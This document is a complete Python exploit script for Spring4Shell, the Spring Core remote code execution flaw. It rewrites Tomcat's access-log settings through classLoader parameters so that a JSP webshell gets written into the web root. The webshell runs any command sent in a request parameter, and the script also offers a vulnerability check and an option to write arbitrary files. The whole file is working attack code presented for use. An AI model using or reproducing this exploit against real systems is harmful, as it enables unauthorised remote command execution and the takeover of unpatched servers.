# b0yd @ Securifera

import requests
import argparse
import time

from urllib.parse import urlparse

proxies = None
proxies = {
'http': 'http://127.0.0.1:8080',
'https': 'http://127.0.0.1:8080',
}

post_headers = {"Content-Type":"application/x-www-form-urlencoded"}
get_headers = {"X-Back":"%>//",
            "X-Runtime":"Runtime",
            "X-Front":"<%",
}

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Payload
webshell = "%25%7BX-Front%7Di%20java.io.InputStream%20in%20%3D%20%25%7BX-Runtime%7Di.getRuntime().exec(request.getParameter(%22i%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B1024%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%7D%20%25%7BX-Back%7Di&"


def check_vuln(url):
             
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=c"

    # Send the packet that writes our webshell
    ret = requests.get(url + "?%s" % file_date_data, verify=False, proxies=proxies)
    #print("[*] Response code: %d" % ret.status_code)
    get_code = ret.status_code
    
    # Reset the pattern so we aren't still writing data into our file
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
    #print("[*] Response code: %d" % ret.status_code)       
    post_code = ret.status_code   

    if get_code == 400 or post_code == 400:
        print("[+] Endpoint is likely vulnerable to Spring4Shell")
        return True
    else:
        print("[-] Endpoint is likely not vulnerable to Spring4Shell")
        return False
    

def send_requests(url, directory, filename, file_contents=None):

    if file_contents is None:
        file_contents = webshell
             
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")

    # Reset the pattern so we aren't still writing data into our file
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)        
    
    exp_data =  "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%s&" % file_contents
    exp_data += "class.module.classLoader.resources.context.parent.pipeline.first.directory=%s&" % directory
    exp_data += "class.module.classLoader.resources.context.parent.pipeline.first.prefix=%s&" % filename
    exp_data += "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    # Change the tomcat log location variables
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)
        
    time.sleep(3)        
        
    # Send the packet that writes our webshell
    ret = requests.get(url, headers=get_headers, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)
        
    time.sleep(1)
        
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")

    # Reset the pattern so we aren't still writing data into our file
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)

def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('-u',help='Target Url', required=True)
    parser.add_argument('-f', help='Relative File Path To Write To', required=False)
    parser.add_argument('--dir', help='Destination directory, i.e. "webapps/[appname]"', required=False, default="webapps/ROOT")
    parser.add_argument('--file-contents', help='Data to write into the file', required=False)
    parser.add_argument('--check', help='Check if vulnerable', required=False, action='store_true')

    args = parser.parse_args()
    target_url = args.u
    dest_dir = args.dir
    file_path = args.f
    file_contents = args.file_contents
    check_vuln_flag = args.check
    
    if check_vuln_flag:
        check_vuln(target_url)    
    else:    
    
        try:
            send_requests(target_url, dest_dir, file_path, file_contents)
            if dest_dir == "webapps/ROOT":
                url_obj = urlparse(target_url)
                full_url = url_obj.scheme + "://" +url_obj.netloc + "/" + file_path + "?i=<cmd>"
                print("[+] Navigate to %s: " % full_url)
            else:
                print("[+] File written to: %s" % file_path)
                
        except Exception as e:
            print(e)

if __name__ == '__main__':
    main()
